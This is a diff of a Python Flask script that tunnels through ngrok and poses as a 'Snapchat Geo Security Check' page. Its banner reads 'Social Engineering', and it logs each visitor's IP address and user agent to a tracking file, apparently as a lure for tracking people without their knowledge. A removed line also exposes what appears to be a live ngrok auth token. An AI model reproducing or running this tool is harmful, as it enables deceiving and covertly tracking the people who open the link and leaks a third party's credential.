@@ -7,7 +7,7 @@ import sys
 from datetime import datetime
 from flask import Flask, request, render_template, jsonify
 
-NGROK_AUTH_TOKEN = "2xYj1oYy7eEiF4DZi3a9iZqcYSc_7KpfhVbnc28ESPx4Qg4n8"
+NGROK_AUTH_TOKEN = "YOUR_NGROK_AUTHOTKEN_HERE"
 NGROK_PATH = "ngrok.exe" if os.path.exists("ngrok.exe") else "ngrok"
 FLASK_PORT = 5000
 
@@ -16,7 +16,6 @@ os.makedirs("captures", exist_ok=True)
 
 def check_ngrok():
     try:
-        # Try to run ngrok version to check if it exists
         subprocess.run([NGROK_PATH, "version"], check=True, capture_output=True)
         return True
     except (subprocess.CalledProcessError, FileNotFoundError):
@@ -29,13 +28,28 @@ def check_ngrok():
 
 def print_banner():
     banner = r"""
-   _____                           _             _   _                 
-  / ____|                         | |           | | (_)                
- | (___   __ _  ___ ___  ___  ___ | |_ ___   ___| |_ _  ___  _ __  ___ 
-  \___ \ / _` |/ __/ _ \/ __|/ _ \| __/ _ \ / __| __| |/ _ \| '_ \/ __|
-  ____) | (_| | (_|  __/\__ \ (_) | || (_) | (__| |_| | (_) | | | \__ \
- |_____/ \__,_|\___\___||___/\___/ \__\___/ \___|\__|_|\___/|_| |_|___/
-                                                                        
+ $$$$$$\                      $$\           $$\                                                   
+$$  __$$\                     \__|          $$ |                                                  
+$$ /  \__| $$$$$$\   $$$$$$$\ $$\  $$$$$$\  $$ |                                                  
+\$$$$$$\  $$  __$$\ $$  _____|$$ | \____$$\ $$ |                                                  
+ \____$$\ $$ /  $$ |$$ /      $$ | $$$$$$$ |$$ |                                                  
+$$\   $$ |$$ |  $$ |$$ |      $$ |$$  __$$ |$$ |                                                  
+\$$$$$$  |\$$$$$$  |\$$$$$$$\ $$ |\$$$$$$$ |$$ |                                                  
+ \______/  \______/  \_______|\__| \_______|\__|                                                  
+                                                                                                  
+                                                                                                  
+                                                                                                  
+$$$$$$$$\                     $$\                                         $$\                     
+$$  _____|                    \__|                                        \__|                    
+$$ |      $$$$$$$\   $$$$$$\  $$\ $$$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\  $$\ $$$$$$$\   $$$$$$\  
+$$$$$\    $$  __$$\ $$  __$$\ $$ |$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$ |$$  __$$\ $$  __$$\ 
+$$  __|   $$ |  $$ |$$ /  $$ |$$ |$$ |  $$ |$$$$$$$$ |$$$$$$$$ |$$ |  \__|$$ |$$ |  $$ |$$ /  $$ |
+$$ |      $$ |  $$ |$$ |  $$ |$$ |$$ |  $$ |$$   ____|$$   ____|$$ |      $$ |$$ |  $$ |$$ |  $$ |
+$$$$$$$$\ $$ |  $$ |\$$$$$$$ |$$ |$$ |  $$ |\$$$$$$$\ \$$$$$$$\ $$ |      $$ |$$ |  $$ |\$$$$$$$ |
+\________|\__|  \__| \____$$ |\__|\__|  \__| \_______| \_______|\__|      \__|\__|  \__| \____$$ |
+                    $$\   $$ |                                                          $$\   $$ |
+                    \$$$$$$  |                                                          \$$$$$$  |
+                     \______/                                                            \______/ 
     """
     print(banner)
     print("Starting Snapchat Geo Security Check server...")
@@ -57,34 +71,30 @@ def start_ngrok(port):
         print("[!] Please place ngrok.exe in the same folder as this script.")
         return None, None
 
-    # Kill any existing ngrok processes more thoroughly
     print("[+] Cleaning up any existing ngrok processes...")
-    if os.name == 'nt':  # Windows
+    if os.name == 'nt': 
         os.system('taskkill /f /im ngrok.exe 2>nul')
-        os.system('taskkill /f /im ngrok.exe 2>nul')  # Run twice to ensure it's killed
+        os.system('taskkill /f /im ngrok.exe 2>nul')
     else:  # Unix/Linux
         os.system('pkill -9 ngrok 2>/dev/null')
     
-    time.sleep(2)  # Wait longer for process to be killed
+    time.sleep(2) 
     
-    # Verify ngrok is executable
     try:
         subprocess.run([NGROK_PATH, "version"], check=True, capture_output=True)
     except Exception as e:
         print(f"[!] Error: Cannot execute ngrok: {str(e)}")
         return None, None
 
-    # Kill any existing tunnels
     try:
         subprocess.run([NGROK_PATH, "kill"], check=True, capture_output=True)
     except:
-        pass  # Ignore errors here as it might not be running
+        pass 
 
     ngrok_cmd = [NGROK_PATH, "http", str(port)]
     print(f"[+] Launching ngrok tunnel on port {port} ...")
     
     try:
-        # Start ngrok with full output capture
         ngrok_proc = subprocess.Popen(
             ngrok_cmd,
             stdout=subprocess.PIPE,
@@ -93,9 +103,8 @@ def start_ngrok(port):
         )
         
         print("[+] Waiting for ngrok tunnel to initialize...")
-        time.sleep(5)  # Give ngrok more time to start
+        time.sleep(5) 
 
-        # Check if process is still running
         if ngrok_proc.poll() is not None:
             stdout, stderr = ngrok_proc.communicate()
             print(f"[!] Ngrok process failed to start!")
@@ -110,7 +119,6 @@ def start_ngrok(port):
         public_url = None
         for attempt in range(30):
             try:
-                # Try to get the tunnel info
                 resp = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=5)
                 if resp.status_code == 200:
                     tunnels = resp.json().get("tunnels", [])
@@ -141,12 +149,10 @@ def start_ngrok(port):
 
 @app.route("/")
 def home():
-    # Get visitor information
     user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     user_agent = request.headers.get("User-Agent", "Unknown")
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
-    # Log visitor information
     log_entry = f"[{timestamp}] IP: {user_ip} | User-Agent: {user_agent}\n"
     with open("tracked_users.txt", "a", encoding="utf-8") as f:
         f.write(log_entry)
